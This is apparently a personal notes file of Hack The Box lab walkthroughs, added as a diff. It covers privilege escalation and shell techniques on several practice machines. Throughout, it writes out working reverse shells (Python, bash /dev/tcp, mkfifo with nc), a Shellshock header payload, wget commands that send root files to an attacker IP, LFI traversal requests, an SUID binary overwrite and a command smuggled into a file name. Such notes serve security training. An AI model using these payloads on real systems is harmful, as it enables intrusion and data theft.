@@ -1,0 +1,251 @@
+HTB Scenarios & Notes  IMP ONE LOOK AT IT 
+======================
+
+Hack The Box Pawned Scenarios
+
+
+Scenario 1
+=========================================================================================================================
+I had a web shell which was executing the commands through the web page "http://bashed.htb/phpbash.php" but I wanted to have a stable CLI shell. So i ran the following python command (ofcourse python was installed on the target) to catch the shell on my attacking Kali.
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+make sure your nc listener is running.
+
+Scenario 2
+=========================================================================================================================
+
+scenario: I had a user called www-data and scriptmanager. the user scriptmanager was able to run the command without password so i ran "sudo -u scriptmanager bash -i" to get the shell for the scriptmangaer.
+
+
+
+Scenario 3
+=========================================================================================================================
+Supposed you want to search a NSE scripts for nmap. use "locate -r nse$ | grep ldap" to search all the NSE scripts realated to LDAP. Alternatively use find / -type f -regex '.*nse$' 2>/dev/null | grep 'ldap'
+
+
+Scenario 4
+=========================================================================================================================
+So while pawning the nibble.htb I ran the metasploit to capture the user flag. The exploit for the nibbleblog was present in the metasploit. But afterwards, I was told to look for the command that the user nibbler can run without password. So I ran "sudo -l" which says I can run the monitor.sh file. Upon looking at this file, It has a bunch of shell codes printing system information. But I did the following thing to get the root flag.
+
+echo "cat /root/root.txt > /home/nibbler/personal/stuff/root.txt" > monitor.sh
+
+now upon running the "sudo -n ./monitor.sh", it will create a root.txt file at /home/nibbler/personal/stuff/ path which has the root flag.
+
+
+
+Scenario 5  - Shell Shock using User-Agent Header
+=========================================================================================================================
+When I was solving the beep.htb box, I come across a port 10000 which was Running a service called MinServ and upon visiting the http://beep.htb:10000/ I got a login page where providing the invalid creds leads to the HTTP request 
+/session_login.cgi and upon change the "User-Agent" HTTP header to "User-Agent: () { :; };bash -i >& /dev/tcp/10.10.14.14/1337 0>&1" , I got the root shell. The initial payload to check whether it's vulnerable to Shell Shock or not then put "() { :; };sleep 10" in the HTTP Request header. This should take 10 seconds to respond if Vulnerable.
+
+
+Scenario 6 = freoxbuster with multiple wordlist
+=========================================================================================================================
+I wanted to fuzz with multiple wordlist at once so I found the following command
+feroxbuster -u 10.10.10.60/ -w <(cat /usr/share/wordlists/wfuzz/general/*) -k -x txt
+
+
+Scenario 7 - Intercepting Metasploit exploits through Burp
+=========================================================================================================================
+set Proxies http:127.0.0.1:8080
+set ReverseAllowProxy true
+exploit
+
+Each requests Exploits sends to the target will get intercepted.
+
+
+Scenario 8 - Reading/Overwriting file using wget
+=========================================================================================================================
+Sunday.htb - wget --input-file /root/root.txt --> This will print the content of the root.txt
+
+wget --post-file /root/root.txt http://10.10.14.14:443/  (Run the nc -lvnp 443 on kali) and catch the root flag there
+
+Overwriting the SUID file
+get a shell.py from pentestermonkey and upload it to target using
+wget http://kali.ip:port/shell.py -O /usr/bin/passwd 
+start the nc listener on kali as per shell.py
+run the passwd command on the target within user shell 
+notice the root shell captured 
+
+https://0xdf.gitlab.io/2018/09/29/htb-sunday.html#overwrite
+
+
+Scenario 9 - Name Pipe to get root shell
+=========================================================================================================================
+The pipe is simply a | sing. My payload to get a root shell was 
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 4444 >/tmp/f" > /tmp/listusers
+
+first it check and make sure there's no pipe /tmp/f exist and if exist the remove it
+mkfifo makes the FIFO pipe
+cat the f 
+writing the /bin/sh -i 2 where -i will interactive flag 
+After that, our pipe's content is output to the terminal through cat /tmp/f , then to /bin/sh -i 2>&1 to be executed because of the interactive flag -i . The results of the command are then sent back to us through nc yourIP 9051 , thanks to the redirecting of standard output 1 , and standard error 2 . After that, the loop starts over with the next command entered by the attacker.
+
+
+
+
+
+Scenario 10 - FriendZone.HTB
+=========================================================================================================================
+DNS enumeratoin can be also perform using 'dig axfr friendzone.red @10.10.10.123'
+In this box, I learn that Privilege Escalations can be possible using Python Library Hijacking
+
+https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
+
+First you will need to find the system path using the following python command
+python -c 'import sys; print "\n".join(sys.path)'
+
+now read the article on the link above. Because you are dumb enough to put it in your own words.
+
+New Tool you used: pspy - unprivileged Linux process snooping 
+https://github.com/DominicBreuker/pspy
+It helped me monitoring the hidden cron job. This hidden job was executing a script by root user.
+
+Also following link to upgrade your shell
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+
+Also, you built the following script to enumerate thhose 59 subdomains
+
+#this script was built to make an HTTP request to 59 subdomains and grab the <title> tag attribute in the result to see which one of #those has "LOGIN HERE.." in the title.
+
+file='/home/username/Downloads/Friendzone.htb/subdomain.txt'
+exec<$file
+while read line 
+do
+	wget $line -O - | grep \<title\>|sed "s/\<title\>\([^<]*\).*/\1/"
+done
+
+
+
+Scenario 11 - Swagshop.htb
+=========================================================================================================================
+
+sudo /usr/bin/vi /var/www/html/../../../root/root.txt
+
+One way to read the root flag when your low privilege user allowed to execute the vi command without passworg (sudo -l)
+
+Dealing with Magento CMS and Shoplifting vulnerability was fun. My Exploit didn't ran so I opt a second route of uploading php shell from the category.
+
+
+Other Notes:  Squid Proxy Port Scanner - At some point you will have to experience this in later machines
+A exposed Squid proxy will usually allow an attacker to make requests on their behalf. If misconfigured, this may give the attacker information about devices that they cannot normally reach. For example, an attacker may be able to make requests for internal IP addresses against an open Squid proxy exposed to the Internet, therefore performing a port scan against the internal network. The `auxiliary/scanner/http/open_proxy` module can be used to test for open proxies, though a Squid proxy does not have to be on the open Internet in order to allow for pivoting (e.g. an Intranet Squid proxy which allows the attack to pivot to another part of the internal network) 
+
+
+Scenario 12 - Permx.HTB
+=========================================================================================================================
+This was the link where I found the Working PoC for the Chamilo bigUpload.php Unauthenticated File Upload Vulnerability. 
+CVE-2023-3368
+https://starlabs.sg/
+
+SYMLINKS FucKs You hERE Brutally. Here's what you used to change the shadow file hash for the root user
+
+ln -s / root   #Notice that there's a space between / and root. This will create a symlink with / directory
+
+sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow 		#You are changing the file permission using acl.sh. acl.sh had setfacl -m in it. Now that you've symlinks created access /home/mtz/root/etc/shadow file and you have change its permission, edit it and put the hash of root from your own 'shadow' file in kali. 
+
+quickly login with root and toor and grab the flag. Because the reset.sh runs every 3 minutes which will reset the hash.
+
+NetCat to send and receive file
+nc -l -p 1234 > out.file # ON RECEIVING END 
+
+nc -w 3 [destination] 1234 < out.file # ON SENDING SIDE
+
+https://gtfobins.github.io/#+suid 
+
+This is another important link. GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. 
+
+https://lolbas-project.github.io/#  # ANOTHER ONE FOR WINDOWS ONLY
+
+
+Scenario 13 - Mailing HTB
+===========================================================================================================================
+
+$ hashcat -a 0 -m 0 0a9f8ad8bf896b501dde74f08efd7e4c /usr/share/wordlists/rockyou.txt.gz 
+
+This command was used and worked when cracking the hash with hashcat.
+
+You also learn about MonikerLink bug CVE-2024-21413
+
+
+Download & Upload files to Target & Vitcim - https://juggernaut-sec.com/windows-file-transfers-for-hackers/
+
+LFI Payload: GET /download.php?file=\..\..\..\..\..\..\WINDOWS\System32\drivers\etc\hosts HTTP/1.1
+
+GET /download.php?file=\..\..\..\..\..\Program+Files+(x86)\hmailserver\bin\hmailserver.ini 
+
+
+
+
+
+
+Scenario 14  -  Networked.HTB
+=======================================================================================================================
+
+In order to get the root flag, I used the https://seclists.org/fulldisclosure/2019/Apr/24 Redhat/CentOS root through network-scripts
+Technique. There was a script present that the user can run without password. 
+
+sudo /usr/local/sbin/changename.sh
+
+[guly@networked network-scripts]#  cat sudo /usr/local/sbin/changename.sh
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+        echo "interface $var:"
+        read x
+        while [[ ! $x =~ $regexp ]]; do
+                echo "wrong input, try again"
+                echo "interface $var:"
+                read x
+        done
+        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0
+
+
+This script takes Input from the user. My Input were as follows
+
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+guly0 /bin/bash
+guly0 /bin/bash
+interface PROXY_METHOD:
+aa
+aa
+interface BROWSER_ONLY:
+aa
+aa
+interface BOOTPROTO:
+aa
+aa
+[root@networked network-scripts]# cat /root/root.txt
+cat /root/root.txt
+3bc1cc0fa7acf3499c5a285e616f5a2f
+
+echo -n 'bash -c "bash -i >/dev/tcp/10.10.16.5/1337 0>&1"' | base64
+cd /var/www/html/uploads/
+touch -- ';echo | base64 -d | bash'
+
+
+
+Mirai.HTB 
+=======================================================================================================================
+This was the woking wfuzz command. Remember the Wordlist as an argument should go first.
+wfuzz -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -H "Host: FUZZ.mirai.htb" --hl 135 mirai.htb
+
+
+
+Blocky.HTB
+
+=======================================================================================================================
+
+Let's see
